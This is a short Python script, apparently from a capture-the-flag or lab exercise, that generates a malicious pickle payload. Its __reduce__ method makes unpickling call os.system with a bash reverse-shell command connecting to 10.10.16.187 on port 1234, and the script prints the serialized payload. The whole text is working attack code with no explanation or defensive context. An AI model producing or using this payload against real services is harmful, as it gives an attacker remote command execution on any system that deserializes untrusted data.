import cPickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.16.187/1234 0>&1'",))

payload = cPickle.dumps(Exploit())
print(repr(payload))
